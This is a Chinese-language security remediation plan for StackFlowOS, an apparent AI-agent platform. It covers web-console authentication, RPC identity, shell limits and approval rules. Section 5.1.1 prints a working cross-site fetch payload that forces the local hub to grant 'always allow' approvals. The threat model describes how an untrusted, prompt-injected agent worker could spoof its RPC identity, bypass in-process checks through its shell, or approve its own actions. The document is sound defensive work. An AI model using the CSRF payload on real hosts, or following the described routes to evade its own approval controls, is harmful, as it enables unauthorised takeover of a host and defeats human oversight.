# StackFlowOS 安全修复方案

> 输入：2026-11 代码审查结果（Web、RPC、工具执行、app 主体；258 通过 / 3 失败）。
> 审查基线：`origin/main` = `b5efb32`（含 PR #1 `fix/agent-loop-and-approvals`、PR #2 `fix/approval-hardening`）。
> 本机复核：在 `/tmp/sfo-origin` 对 `b5efb32` 跑全量测试为 **261 passed / 0 failed**；审查里的 3 个失败由检出路径过长触发 IPC socket 长度上限，属于测试环境问题（§6.16）。
> 参考实现：本机 DeepSeek Harness（下称 DSH，`/home/nihao/tool/deepseek-harness`）与 Pi Agent Desktop（下称 Pi，`github.com/DLYZZT/pi-desktop`，内置 `@earendil-works/pi-coding-agent` 1.2.0）。
> 本文是方案 + 实施记录；代码修复已按 §14 落地。

**目录**：[0 摘要](#0-结论摘要tldr) · [1 基线](#1-基线与复现) · [2 威胁模型](#2-威胁模型与设计原则) · [3 参考决策](#3-参考决策dsh-与-pi-怎么做) · [4 总表](#4-修复总表) · [5 P0](#5-p0-详细方案) · [6 P1](#6-p1-详细方案健壮性) · [7 P2](#7-p2--后续路线) · [8 测试](#8-测试计划) · [9 实施](#9-实施计划) · [10 文件](#10-文件改动清单) · [11 风险](#11-风险与开放问题需要拍板) · [12 附录](#12-附录) · [13 链接](#13-参考链接) · [14 实施记录](#14-实施记录2026-11-23)

---

## 0. 结论摘要（TL;DR）

1. **真正的高危不是单个过滤函数，而是三个结构性缺口**：
   - **浏览器控制面没有身份**：任意网页可用 `text/plain` 的简单 POST 跨站调用 `POST /api/approvals/*/decide`、`POST /api/rules`、`POST /api/chat`、`POST /api/projects/*/delete`、`POST /api/agents`、`POST /api/units/*/kill` 等；`PATCH /api/config`、`DELETE` 类因为需要 CORS 预检，浏览器侧不能直接发，但认证层仍要统一覆盖。SSE 还带 `Access-Control-Allow-Origin: *`。在当前 `main` 线上，`/api/chat` 还能调用 operator 工具（附件目录、切可写、决定审批），属于**未授权的主机级控制**。
   - **RPC 的 `src` 由对端自报**：`_bind_principal` 只在 `approval.request` 上做了一次“看起来像绑定”的检查，但 `src` 本身可伪造，因此可以冒充别的 unit；`project.delete`、`agent.kill`、`unit.kill`、`project.update`、`event.append`、`approval.use`、`lease.*`、`unit.release` 都不在特权集合里。
   - **执行边界靠 worker 进程内的检查**：worker 只要拿到 shell，就能绕开 `ToolExecutor` 直接走 RPC；审批、路径、项目范围都没有在 hub 侧强制。
2. **修复原则**：所有安全判定移到 **hub 侧**；RPC 身份由 **hub 绑定的连接凭证**决定，`src` 只做展示；URL/路径/命令的“匹配语义”全部改成**边界安全、全匹配、规范化后匹配**；网络默认拒绝私网；shell 用**进程组 + 有界输出**；审批默认 **one-shot**，持久授权只允许从设置页显式创建。
3. **路线**：Phase 0 红测试 → Phase 1 Web 控制面 → Phase 2 RPC 身份与授权 → Phase 3 执行与策略 → Phase 4 健壮性 → Phase 5 OS 沙箱/远程。P0 约 **14–21 人日**，全部约 **22–35 人日**（含合并/测试；按一人全职估算）。
4. **不能完全消灭的残余风险**：同一 OS 用户下的任意进程最终可以杀 hub、读状态文件、伪造本地请求。DSH 的威胁模型也止于 OS 用户边界（其签名密钥在 `0600` 凭据文件里，同用户可读）；Pi 的文件围栏只保护文件 API，不约束 bash。StackFlowOS 应明确写出这一假设，并把“防 agent 自审批”做成**凭证不下发 + 角色白名单**，而不是假装本地进程互相隔离。

---

## 1. 基线与复现

### 1.1 审查基线

| 项 | 值 |
|---|---|
| 审查对象 | `origin/main` `b5efb32`（merge PR #2） |
| 关键提交 | `361448a` agent loop、`b6ffeb1` standing grants exact、`f72fd57` approval hardening |
| 测试 | 261 个用例；本机 261 通过；审查环境 258 通过、3 失败（IPC 路径过长） |
| 关键文件 | `web/server.py`、`web/api.py`、`app.py`、`transport/nng.py`、`agents/tools.py`、`security/policy.py`、`security/capabilities.py`、`security/approvals.py`、`projects/store.py`、`agents/brain.py`、`agents/supervisor.py`、`kernel/context.py`、`l2/eventlog.py`、`l2/failure.py` |

### 1.2 本机动态复核

- 在 `/tmp/sfo-origin` 解包 `b5efb32` 后执行 `python3 -m unittest discover -s tests`：**261 tests OK**。
- `tests/test_address.py`、`tests/test_transport.py` 把临时目录放在 `<repo>/.stackflowos/tmp`；当检出路径 > ~55 字符时，`run/<work_id>.rpc.sock` 超过 `sockaddr_un` 的 ~108 字节上限（代码自设 `MAX_IPC_PATH_BYTES = 100`），于是失败。路径短时通过，说明是**测试隔离问题**，不是传输层回归。审查环境失败的是 `test_address` 2 个 + `test_transport` 1 个；本机检出路径较短，未复现这 3 个失败（261 全过）；但代码上限和审查描述一致，§6.16 的修法不依赖是否复现。
- 代码事实均按 `b5efb32` 行号引用；当前工作区 `main` 是 `70dcc7e`，与基线分叉，行号不同（§1.3）。

### 1.3 工作区与基线的分叉（必须先处理）

当前工作区 `main`（`70dcc7e`）**不包含** PR #1/#2，因此：

- 没有 `external` 参数、没有 `_bind_principal`；
- 有 `session/operator.py`、`project.attach`、`attached-ro` 等基线没有的功能；
- 测试 285 个，基线 261 个；
- 在本地方案里，Web 未授权还可以通过 `/api/chat` 触发 operator 的 `project.attach` / `project.access` / `approval.decide`（§5.1.9 X1）。

**建议的合并顺序**（否则本方案的行号和修复点会对不上）：

1. 把 `origin/main`（`b5efb32`）合入产品 `main`，或把 PR #1/#2 的提交 rebase 到产品 `main`；
2. 解决冲突时保留产品线的 `operator` / `attach` / `units` / systemd 功能，同时移植 `external`、`_bind_principal`、`once` 预消费等 PR 改动；
3. 跑合流后的全量测试（预计 285+，以实际为准）；
4. 再按本方案实施。若必须先修 PR，则把方案应用在 `b5efb32` 上，最后整体前向移植；两种顺序的修复点相同。

> 注意：PR #2 的 `_bind_principal` 不是“身份认证”，只是把 `approval.request` 的 principal 与 `_agent_for_unit(src)` 对齐。由于 `src` 来自 envelope，攻击者把 `src` 设成别的 unit id 就能借用其 principal；因此 Phase 2 必须替换而不是保留。

---

## 2. 威胁模型与设计原则

### 2.1 资产

| 资产 | 说明 |
|---|---|
| 操作员权限 | 审批决定、规则、配置、项目删除、附件目录/切可写、Agent 生命周期 |
| 审批与审计 | `approval.*`、`rule.*`、`operator.*`、`project.deleted` 等事件的可信度 |
| 项目数据 | 项目 workspace、任务、记忆、事件流 |
| 宿主机 | shell 以 hub/worker 进程的 OS 用户身份执行；同用户文件系统可读 |
| 凭证 | LLM API key、shell 环境里的 token、Web 会话 |

### 2.2 参与者与信任边界

| 参与者 | 信任级别 | 说明 |
|---|---|---|
| 操作员浏览器 | 可信，但页面可被跨站攻击 | 需要认证 + CSRF/DNS rebinding/点击劫持防护 |
| Agent worker | **不可信**（LLM 可被提示注入） | 即使进程是同一 OS 用户，也只能拥有“worker 角色”权限 |
| 本地同用户进程 | **无法完全隔离** | 可杀 hub、读状态；本方案只提高门槛并写清假设 |
| 远程设备（TCP） | 不可信 | 必须认证 + 显式开启；默认 loopback |
| 外部网页内容（net.fetch） | 不可信数据 | 可能包含提示注入；不得成为指令 |
| hub 内部 operator（chat/UI） | 操作员代理 | 直接调用 app，不经过 worker RPC；Web 层必须已认证 |

### 2.3 设计原则

1. **hub 侧强制**：审批、身份、项目范围、路径复核都在 hub 侧做；worker 内的检查只用于“早失败/好体验”，不是安全边界（与 DSH 的“进程内围栏不是内核边界”一致）。
2. **默认拒绝**：动作白名单；私网默认拒绝；没有 answerer 时审批 fail-closed；未知事件类型拒绝。
3. **one-shot 优先**：一次审批只授权一次调用；持久授权必须显式创建、范围明确、可审计（DSH 只有 `allowed-once`，Pi 把永久权限放在设置页）。
4. **规范化后匹配**：路径先 `resolve`，URL 按 scheme/host/port/path 边界，命令全匹配；不做“字符串前缀”。
5. **凭证不下发**：operator/Web 凭证不落盘、不进 env/日志；worker 只拿到自己的 unit token；shell 环境用 allowlist。
6. **可审计**：审批决策保存“输入快照 + 哈希 + 截断标记”，不只保存 reason；事件 source 由 hub 赋值。
7. **不假装隔离**：Phase 1–4 是“控制面加固”；真正的代码执行隔离（Landlock/bwrap/独立用户）在 Phase 5，明确写进 README 的已知限制。

### 2.4 非目标（本方案不做）

- 多租户、多用户账号体系；
- 把 hub 直接暴露到公网（只做“显式开启 + TLS/反代 + token”的最小支持）；
- 在 Phase 1 就实现容器级沙箱；
- 重写前端框架或引入 ASGI 依赖。StackFlowOS 的“零依赖 stdlib HTTP”约束保留。

---

## 3. 参考决策：DSH 与 Pi 怎么做

> 这一节不是“抄功能”，而是列出可验证的机制与取舍，后面的“决策”都引用这里。DSH 证据路径相对 `/home/nihao/tool/deepseek-harness`；Pi 证据来自 AppImage 解包与官方文档。
>
> **身份纠正**：本机 `Pi-Agent-Desktop-0.4.2` 的 `app.asar` 显示包名为 `@dlyzzt/pi-desktop`、Apache-2.0、仓库 `github.com/DLYZZT/pi-desktop`，内置 `@earendil-works/pi-coding-agent` 1.2.0；它不是 withpi.ai 的评分 SDK。下文“Pi”均指这个桌面 Agent。

### 3.1 本地 Web/UI 认证

| 维度 | DSH | Pi | StackFlowOS 决策 |
|---|---|---|---|
| 监听 | 默认 `127.0.0.1:3080`；代码层拒绝 unspecified/wildcard bind | UI/控制面不监听端口，用 MessagePort + 类型化 RPC；只有 MCP OAuth 回调临时开 loopback | 默认 loopback；**代码层拒绝 `0.0.0.0`/`::`**，远程必须显式 `allow_remote` + TLS/反代 |
| 启动凭证 | 每进程 32 字节随机 launch token；`GET /?token=` 换 HMAC 签名 Cookie；token 不落盘/不进 env | 零端口，优先进程内通道 | 采用 DSH：launch token → HttpOnly/SameSite=Strict Cookie；Cookie 绑定 authority；token 只在内存，不写日志/文件 |
| Host/Origin | `api-request-trust.ts`：Host 必须 loopback/绑定的 bind IP/trustedHosts；`Sec-Fetch-Site: cross-site` 拒绝；Origin 必须与 Host 同 authority | preload 白名单 + sender 校验；无 HTTP 面 | 采用 DSH，并做成**统一 admission**（anonymous 路由也过） |
| CSRF | 无 CSRF token；靠 SameSite=Strict + Origin + 非 simple Content-Type | 无 HTTP 面 | SameSite=Strict + Origin/Sec-Fetch + 自定义头 + 强制 `application/json`（四层） |
| 安全响应头 | 主页面**基本没有** CSP/XFO/nosniff（缺口） | renderer CSP `default-src 'self' app:` | **不照搬 DSH 的缺口**：加 CSP + frame-ancestors/XFO + nosniff + Referrer-Policy + no-store |
| CORS | 生产代码无 `Access-Control-Allow-Origin` | 无 | 不设任何 CORS 头；SSE 也不设 |
| SSE/WS | 主通道 WebSocket，`required` + Cookie；SSE 仅 HMR anonymous | 无 | SSE 必须认证；去掉 `ACAO: *`；心跳/并发上限 |
| CLI/本地工具 | 签名密钥在 `$DSH_HOME/.credentials.yaml`（0600），同用户可读 | 零端口 | 浏览器用 token；CLI 走 **Unix control socket + `SO_PEERCRED` + worker 祖先拒绝**（Linux），token 不落盘 |
| 残余风险 | 文档承认：同用户进程可完全控制 Host API | 文件 API 有边界，bash 仍用户权限 | 写进威胁模型；Phase 5 用 OS 沙箱/独立用户降低 |

**决策 D1（Web）**：采用“DSH 的 token→Cookie + 统一 admission”，补上 DSH 缺的安全响应头；CLI 不落盘 token，改用本地 control socket。不在 Web 上做多用户，只区分“操作员/非操作员”。

### 3.2 审批模型

| 维度 | DSH | Pi | StackFlowOS 决策 |
|---|---|---|---|
| 审批粒度 | 只有 `ask`/`never`；结果只有 `allowed-once`；无 always/规则库 | 不逐条命令审批；三层工具策略 + 首次确认 + 敏感动作二次确认 + 会话级授权 | **默认 one-shot**；`session` 可选；**移除弹窗里的“总是允许”自动泛化**；永久规则只能从设置页显式创建 |
| 规则匹配 | 无 glob/regex/URL 前缀 | 无命令 allowlist | 保留规则能力，但匹配语义按 §5.4 修；旧的不安全规则在加载时标记并 fail-closed |
| 预览 | 拼接模型 justification，无截断/脱敏；审计不含 preview | 敏感动作说明截 512 字符；按钮默认 Deny、cancelId=0 | 保存“完整预览（上限 64KB）+ sha256 + truncated 标记”；日志/事件只存截断+哈希；UI 可展开 |
| 失败 | 无 answerer → `unavailable`，fail closed | 超时默认拒绝；deny 粘性 | 保持 fail-closed；增加“grant claim”原子消费 |
| 审批身份 | 服务端 Peer 绑定；wire 不传 principal | IPC sender 校验 | hub 从连接凭证推导 principal；拒绝 `data.principal` |
| 持久授权 | 无 | 设置页永久权限 + 会话级授权（policyRevision 失效） | 设置页 rules + `policyRevision`；改规则/设置使旧会话 grant 失效 |

**决策 D2（审批）**：采用 DSH 的“one-shot 是唯一默认授权”，吸收 Pi 的“设置页永久权限 + 会话级授权（带 revision）”；不采用 StackFlowOS 现在的“从一次审批自动泛化成命令族/角色族规则”。原因：自动泛化是 `command_regex`/`url_prefix`/`path_glob` 绕过的主要放大器。

**不照搬 Pi 的“不逐条命令审批”**：Pi 的前提是文件 API 边界 + 工具策略 + 敏感动作二次确认，且它明确不把 bash 当沙箱；StackFlowOS 目前没有 OS 沙箱，`shell.exec` 直接以用户权限运行，所以保留“高风险动作逐条审批 + one-shot”是必要的。等 Phase 5 的沙箱/独立用户落地后，再考虑把低风险命令族降为会话授权。

### 3.3 执行与 shell

| 维度 | DSH | Pi | StackFlowOS 决策 |
|---|---|---|---|
| 模式 | `read-only` / `workspace-write` / `danger-full-access`；默认 read-only | 无内建沙箱；managed process 默认关；bash 不受文件 API 约束 | 采用三档模式（Phase 5 真正强制）；Phase 1–4 用路径检查 + 角色白名单 |
| OS 沙箱 | bwrap/Landlock/Seatbelt/Windows ACL；无后端则拒绝执行（不降级） | 无 | Phase 5 用 Landlock（Linux）优先，失败拒绝执行；网络命名空间另做 |
| 超时 | 工具 deadline + 执行器默认 120s/上限 600s；TERM→3s→KILL **进程组**；输出 64KB 内存 + 64MB spill | `timeout` 可选、无默认；`killProcessTree`（SIGKILL 进程组 / taskkill /T）；输出 2000 行/50KB | 硬上限 `shell_max_timeout_s=600`；`start_new_session=True` + `killpg`；输出有界 + spill 文件 0600 |
| 命令链 | 未发现链式语法检查/静态风险分级 | 无命令 allowlist | 不把“命令链正则”当安全边界；`command_regex` 全匹配 + 链式命令禁止 `always` 泛化；风险仍为 high + 人工审批 |
| env | 过滤 `KEY|PASSWORD|SECRET|TOKEN` 与 `DSH_*` | shell 继承完整 env（已记录的缺口） | **allowlist**（PATH/HOME/LANG/TZ/TMPDIR/…），默认不继承凭证；可配置扩展 |

**决策 D3（执行）**：短期（P0）先解决“超时挂死 + 无界内存 + 进程组残留”；中期（P2）引入 DSH 式三档权限；长期（P3）Landlock/bwrap + 独立用户。shell 始终是 high risk，不因“规则允许”而变成无审批。

### 3.4 RPC / IPC 身份

| 维度 | DSH | Pi | StackFlowOS 决策 |
|---|---|---|---|
| 身份 | 服务端 Peer 绑定，wire 不传 principal/src；owner 与 remote 按 principal 决策 | IPC sender 校验（主窗口/主 frame）+ preload 白名单；lease 带 sessionId+permission+policyRevision | envelope 增加 `auth`（v2），hub 从 token 推导 unit/operator principal；`src` 仅展示；动作白名单 + 项目范围 |
| 高危动作 | kill/delete **未发现**逐动作审批（缺口） | 敏感动作二次确认 + 设置页永久权限 | project.delete/agent.kill/unit.kill/config/rule/approval.decide 仅 operator；worker 工具目录移除 delete |
| 事件 | source/type 由代码构造；受信插件可 append 任意事件（缺口） | 无对应面 | worker 事件走 `event.append` + token，hub 赋 source/type 白名单；**停用未认证的 worker→hub PUB 发布** |
| 跨项目 | agent-scoped 工具、job owner 校验、session cwd | 文件 API 边界、lease | hub 校验 task.project_id / agent.project_id / event.project_id / memory.project_id |

**决策 D4（RPC）**：`src` 不再参与授权；连接凭证 → principal → 动作白名单 → 资源范围，四层都在 hub。unit token 只授予 worker 角色；operator token 只在 hub 内/web 会话中存在，不落盘、不进 worker env。

### 3.5 网络访问（SSRF）

| 维度 | DSH | Pi | StackFlowOS 决策 |
|---|---|---|---|
| 私网 | 本地 fetch provider **明确允许**内网/本机；无 SSRF IP 过滤（缺口） | `allowPrivateNetwork` 默认 false；strict 无沙箱时拒绝；DNS TOCTOU 未消除 | **默认拒绝 loopback/私网/链路本地/元数据**；显式 `security.allow_private_network=true` 才允许（且 high risk） |
| 重定向 | 仅同源、最多 5 跳、逐跳校验 scheme/凭据/长度 | — | 自定义 redirect handler，逐跳校验；私网目标在“发起请求前”拒绝 |
| 响应 | 5MB / 10 万字符 / 30s | — | 保持 `MAX_READ_BYTES=2MB`、`NET_TIMEOUT_S=15`；加 content-type/大小校验 |

**决策 D5（网络）**：比 DSH 更严：默认不允许访问本机/内网。理由：StackFlowOS 的 hub 自身就监听 loopback 审批/配置接口，SSRF 到 `127.0.0.1:17800` 等于绕过浏览器边界。

### 3.6 脱敏、审计与数据健壮性

| 维度 | DSH | Pi | StackFlowOS 决策 |
|---|---|---|---|
| 脱敏 | 凭据文件权限 0600；日志上传默认开、无 redact（缺口） | 统一 redact：Authorization 整行、`*_TOKEN`、token/password/secret/api_key、`gh*_`/`npm_`、URL userinfo、敏感 query | 两层：入站最小化 env；出站统一 redact（preview/log/event/operator.action） |
| 审计 | 只有 reason/tool/callId；完整参数另存 tool/call | 审计 HMAC 摘要 + 不透明 id | 审批存快照（截断+脱敏+sha256）；事件 source 不可伪造 |
| 数据 | 损坏默认拒绝，恢复已提交前缀；凭据权限宽于 0600 拒绝启动 | fail-closed | 规则/审批/记忆损坏：隔离 + 告警，不崩 hub；类型错误 → 400 而非 500 |
| 限额 | body 300MB、工具输出上限；未发现单事件上限 | 输出 50KB | 保持 1MB body；加 header/请求行上限、单事件/预览/记忆上限 |

**决策 D6（数据）**：对“损坏数据”采用“隔离 + 显式告警 + 从空/已提交前缀恢复”，而不是静默跳过；对外部输入（Web/RPC/工具输出）全部设显式上限。

---

## 4. 修复总表

> 严重度：P0 = 可导致未授权控制/越权/主机级影响；P1 = 可绕过或稳定性/一致性；P2 = 加固/体验。
> “位置”行号均为 `b5efb32`；本地 `main` 的对应位置在 §1.3 说明。

| ID | 严重度 | 问题 | 位置 | 修复要点 | 阶段 |
|---|---|---|---|---|---|
| H1 | P0 | Web 无认证/CSRF/Host/Origin/Content-Type/安全头；可点击劫持；agent shell 可 curl | `web/server.py:8-10,135-163`；`web/api.py:32-55` | token→Cookie + 统一 admission + 安全响应头 + 强制 JSON + 自定义头 | 1 |
| H2 | P0 | SSE `Access-Control-Allow-Origin: *` | `web/server.py:232` | 去 CORS；SSE 认证；心跳/并发上限 | 1 |
| H3 | P0 | RPC `src` 自报；特权集合不全；lease/event/approval 可冒用 | `app.py:37-38,438-458,620-717,719-736,1006`；`transport/nng.py` | `auth` v2；principal 由 hub 绑定；动作白名单 + 资源范围 | 2 |
| H4 | P0 | shell 超时只杀 shell，祖父进程持管道导致 `communicate()` 永久挂死；输出无界 | `agents/tools.py:768-820` | `start_new_session` + `killpg` + 有界读 + 二次超时；输出 spill | 3 |
| M1 | P0 | `url_prefix` 无主机/端口/路径边界 | `security/policy.py:234` | scheme+host+port+path 边界比较 | 3 |
| M2 | P0 | `path_glob` 匹配原始路径，`fnmatch *` 跨目录 | `security/policy.py:211-217` | 规范化后匹配；`*` 不跨 `/`，`**` 跨目录；全匹配 | 3 |
| M3 | P0 | `command_regex` 用 `re.search`，无命令链检查 | `security/policy.py:218-226` | `fullmatch` + 链式命令禁止 `always` 泛化 + legacy 规则隔离 | 3 |
| M4 | P0 | net.fetch 私网只“升 medium”（空操作），重定向不重审 | `security/capabilities.py:164-176`；`agents/tools.py:838-875` | 私网默认拒绝；重定向逐跳校验；私网→high | 3 |
| M5 | P0 | task/agent/event/list 跨项目越权 | `app.py:853-870,934-947,1006-1024`；`agents/tools.py` | hub 侧 project 绑定；list 默认过滤 | 2 |
| M6 | P0 | `project.delete` 工具自动填 confirm | `agents/tools.py:944-960` | 从 worker 角色移除；operator/UI 显式确认 | 2 |
| M9 | P0 | `risk()` 直接拼 `projects_root/project_id` | `security/policy.py:269-276`；`security/approvals.py:484-491` | project_id 白名单 + resolve 包含检查 | 3 |
| X1 | P0 | 本地 main：未认证 `/api/chat` → operator attach/access/decide | `session/chat.py`、`session/operator.py` | 合并后随 H1 鉴权；operator 只在已认证 web/hub 内 | 1 |
| X2 | P0 | worker→hub 事件 PUB 无认证，可伪造审计事件 | `transport/nng.py`、`units/worker.py`、`app.py:954-963` | 停用外部 PUB 发布，统一走 `event.append` + token | 2 |
| M7 | P1 | 预览截断 4000，恶意内容可藏在后面 | `agents/tools.py:245,468`；`app.py:719-734` | 完整预览（64KB）+ 哈希 + truncated 标记；UI 展开 | 4 |
| M8 | P1 | `_redact` 漏 `Authorization: Bearer xxx` | `agents/tools.py:45-47,228` | 扩展到 Authorization/Bearer/cookie/JWT/userinfo | 4 |
| M10 | P1 | once 授权消费非原子（可能先消耗后原请求报 already used） | `security/approvals.py:111-199,475-482`；`agents/tools.py:402-416` | 原子 `claim`/消费；并发测试 | 4 |
| L1 | P1 | Web 输入校验/错误泄露/心跳/头部/慢连接 | `web/server.py:135-163,249`；`web/api.py:53,229,233` | 统一校验、400/413/431、通用 500、上限 | 4 |
| L2 | P1 | `project_card` 用子串匹配租约 | `app.py:1500-1501` | 精确解析 `project:<id>:` / metadata | 4 |
| L3 | P1 | Rule/Policies 对损坏数据不容错；update_rule 500 | `security/policy.py:74-81,148-168,309-329` | 类型校验/隔离无效规则；400 | 4 |
| L4 | P1 | shell 日志毫秒命名冲突；stdout 未脱敏 | `agents/tools.py:822-836` | 纳秒+随机；0600；redact；大小上限 | 4 |
| L5 | P1 | `timeout_s` 无上限；NaN/Inf；`_arg_int` inf 溢出 | `agents/tools.py:182-199,768` | 有限值校验；上限；溢出→ToolError | 4 |
| L6 | P1 | MemoryStore 整文件重写/无上限/损坏崩启动 | `app.py:46-63` | 分项目文件 + 原子写 + 大小上限 + 隔离损坏 | 4 |
| L7 | P1 | console 只取尾部 `limit*4` 再过滤项目 | `app.py:1575-1584` | EventLog 带过滤的查询（内存+文件倒序） | 4 |
| L8 | P1 | tcp/web host 可为 `0.0.0.0`，无认证 | `config.py:46-64,213-247` | 代码层拒绝 wildcard；远程显式开启 + token/TLS | 2/5 |
| S1 | P1 | project/task update 先改内存再校验 | `projects/store.py:315-360,524-633` | 深拷贝候选 → 校验 → 原子替换 | 4 |
| S2 | P1 | add_task 不校验 deps（悬空/跨项目/自引用/环） | `projects/store.py:406-450` | 同项目、存在、非自身、无环 | 4 |
| S3 | P1 | supervisor `_terminate` 只发 terminate，不等待/不升级 | `agents/supervisor.py:531-541` | 进程组 TERM→等待→KILL；清理日志 | 4 |
| S4 | P1 | coder 失败仍继续登记产物/推进 review | `agents/brain.py:299-316` | 失败即终止/打回；`_compiled` 成功后置位 | 4 |
| S5 | P1 | reviewer 读产物失败仍可能判通过 | `agents/brain.py:354-407` | 读失败 → 打回/blocked | 4 |
| S6 | P2 | 插件异步启动中被 dispose，晚到 disposer 泄漏 | `kernel/context.py:223-298` | 晚到 disposer 立即执行；dispose 等待启动任务 | 4 |
| S7 | P2 | eventlog 订阅者列表无锁 | `l2/eventlog.py:153-186` | 加锁快照；并发测试 | 4 |
| S8 | P2 | failure `_history` 无限增长 | `l2/failure.py:76,206,244-249` | 按窗口清理 + 字典上限 | 4 |
| L9 | P1 | 测试临时目录依赖检出路径长度 | `tests/test_address.py:20`、`test_transport.py:35` | 改用 `/tmp` 短目录；路径过长时明确 skip | 0 |

> X1 只在本地 `main` 存在；如果只修 `b5efb32`，该项不适用，但合并后必须一起修。

---

## 5. P0 详细方案

### 5.1 H1/H2：Web 控制面认证、CSRF、点击劫持、SSE

#### 5.1.1 现状与攻击链

`web/server.py` 开头自述“binds loopback by default and has no authentication”；`_read_request()` 只读 `Content-Length`，不检查 `Content-Type`、`Host`、`Origin`；`WebAPI.handle()` 对任何 `body` 直接 `json.loads`。

跨站攻击（任意网页）：

```js
// 不需要读响应，只要执行
fetch('http://127.0.0.1:17800/api/approvals/apr-xxxx/decide', {
  method: 'POST',
  mode: 'no-cors',
  headers: {'Content-Type': 'text/plain'},
  body: '{"decision":"allow","mode":"always"}'
});
```

服务端 `_decode_body` 不检查 Content-Type，`json.loads` 成功，审批被放行。`/api/rules` 可以直接建 `principal="*"`、`capability="*"`、`risk_max="high"` 的 allow 规则；`POST /api/projects/p-1/delete` 带 `confirm` 即可删项目；`POST /api/chat` 可以触发 operator。`PATCH /api/config`、`DELETE /api/agents/{id}` 这类需要预检的请求浏览器不能直接跨站发送，但同样的“不校验来源”问题一旦遇到 DNS rebinding/本地中间页仍会暴露。DNS rebinding 时 `Host` 是攻击者域名，但服务端不校验；点击劫持时页面没有 `X-Frame-Options`/`frame-ancestors`，审批按钮可被 iframe 覆盖。

叠加风险：

- **X1（本地 main）**：`/api/chat` 接受文本，“批准 apr-xxx”/“打开 /path 这个项目”会走 `operator` 工具，等价于未授权的 operator。
- **H2**：SSE 响应带 `Access-Control-Allow-Origin: *`，任意网页可读实时事件流（项目内容、审批预览）。
- **H3**：agent shell 不需要浏览器也能 `curl` 本机端口；Web 认证只解决浏览器侧，agent 侧要靠 RPC 角色白名单（§5.2）。

#### 5.1.2 目标

- 未认证的请求**不能**读写任何 `/api/*`，也不能读 SSE；
- 跨站请求（无论是否带 Cookie）不能产生副作用；
- DNS rebinding 不能读到响应；
- 点击劫持不能点到审批按钮；
- 正常用户体验：打开 `http://127.0.0.1:17800/?token=...` 一次，之后刷新/重连不需要再带 token；
- 测试/CLI 可用 `Authorization: Bearer <token>` 或本地 control socket，不依赖 Cookie。

#### 5.1.3 认证流程（采用 DSH 的 token→Cookie）

```
sfo hub 启动
  ├─ launch_token = secrets.token_urlsafe(32)        # 32B，43 chars
  ├─ cookie_secret = secrets.token_bytes(32)         # HMAC-SHA256，仅内存
  ├─ 生成/打印（仅 TTY，不写日志）:
  │    http://127.0.0.1:17800/?token=<launch_token>
  └─ 启动 HTTP server

浏览器 GET /?token=<T>
  ├─ 校验 method=GET、path=/、token 恰好 1 个、constant-time 比较
  ├─ authority = Host header（必须是允许的 authority）
  ├─ Set-Cookie: sfo_session=v1.<base64(payload)>.<hmac>
  │    payload = {authority, issuedAt, expiresAt, nonce}
  │    HttpOnly; SameSite=Strict; Path=/; Max-Age=...; [Secure if TLS]
  ├─ 303 Location: ./
  └─ Cache-Control: no-store; Referrer-Policy: no-referrer

浏览器 GET /（带 Cookie）
  ├─ 校验 Cookie 的 HMAC、authority、过期
  └─ 返回 index.html（含安全响应头）

API/SSE
  ├─ 允许：有效 Cookie（浏览器）或 Authorization: Bearer <launch_token>（CLI/测试）
  ├─ 拒绝：无凭证、错误 token、跨 authority 的 Cookie
  └─ 不设 Access-Control-Allow-Origin
```

**关键取舍**：

- **不把 token 写进 `index.html` 或 `localStorage`**：页面里没有凭据，避免 XSS/截图/日志泄漏；Cookie 由浏览器管理。
- **Cookie 绑定 authority**（`Host`），不同端口/协议不共用；DNS rebinding 时 Cookie 不会被发送到攻击者域名对应的 Host。
- **Cookie 签名密钥只在内存**：hub 重启后 Cookie 失效，用户重新打开启动 URL；这比 DSH 的“持久签名密钥”更严格，符合单机操作台。
- **launch token 一次性**：`sfo url` 每次由 hub 新签发，浏览器兑换成 Cookie 后立即失效；旧 token 不能重放。这比 DSH 的“进程生命周期内可重复使用”更严格，也避免启动链接被复制后长期可用。
- **token 只在 TTY 打印**：systemd/journald 场景不打印；用户用 `sfo url` 通过 control socket 取（§5.1.6）。`SFO_WEB_TOKEN` 环境变量仅作为显式覆盖，不默认使用。
- **不引入第三方依赖**：HMAC 用 `hmac`/`hashlib`，Base64 用 `base64.urlsafe_b64encode`，cookie 解析只解析自己生成的格式。

#### 5.1.4 统一 admission（所有请求，包括 anonymous 静态资源与 SSE）

在 `WebServer._handle_client` 解析出 `method/target/headers` 后、路由前执行：

```python
class Admission:
    def check(self, method, target, headers) -> Decision:
        # 1) authority（防 DNS rebinding / Host 混淆）
        host = headers.get("host", "")
        if not self._authority_allowed(host):
            return deny(403, "host")
        # 2) 来源（防 CSRF；Origin 缺失时看 Sec-Fetch-Site）
        origin = headers.get("origin")
        if origin is not None:
            if not self._origin_allowed(origin, host):
                return deny(403, "origin")
        site = headers.get("sec-fetch-site")
        if site == "cross-site":
            return deny(403, "sec-fetch-site")
        # 3) 非 GET 必须是非 simple 请求
        if method not in ("GET", "HEAD", "OPTIONS"):
            ctype = headers.get("content-type", "").split(";")[0].strip().lower()
            if ctype != "application/json":
                return deny(415, "content-type")
            if headers.get("x-sfo-request") != "1":
                return deny(403, "csrf-header")
        # 4) token/cookie 认证（静态资源可 anonymous，API/SSE 必须 required）
        ...
```

规则：

| 规则 | 说明 |
|---|---|
| `Host` 允许集 | 由 `web.host`/`web.port` 推导：`127.0.0.1:port`、`localhost:port`、`[::1]:port`；非 loopback 绑定时加配置的 `web.trusted_hosts`。只接受精确 `host:port`，拒绝 `Host` 缺失、带 userinfo、带非法字符。 |
| `Origin` | 若存在，必须等于 `http://<允许 authority>` 或 `https://...`；`Origin: null` 拒绝；与 `Host` 的 authority 必须一致。 |
| `Sec-Fetch-Site` | `cross-site` 拒绝；`same-origin`/`none`/缺失（老浏览器/CLI）按 Origin 规则处理。 |
| Content-Type | 非 GET/HEAD 必须是 `application/json`；`text/plain`、`application/x-www-form-urlencoded`、`multipart/form-data` 一律 415。 |
| CSRF header | 非 GET 必须带 `X-SFO-Request: 1`（自定义头触发 CORS 预检；服务端不回应预检，所以跨站无法发送）。 |
| `OPTIONS` | 返回 405，不带任何 `Access-Control-*`。 |
| 认证 | `/api/*`、`/api/events/stream`、`/`、`/index.html` 必须 required；`/css/*`、`/js/*`、`/img/*`、`/favicon.ico` 可 anonymous（不含数据），但**仍过 Host/Origin 检查**。未认证访问 `/` 返回 401 提示页（不渲染应用 shell）。 |
| 错误 | 所有拒绝返回统一的 `{"ok":false,"error":{"code":"UNAUTHORIZED|FORBIDDEN|..."}}`，不泄露内部细节。 |

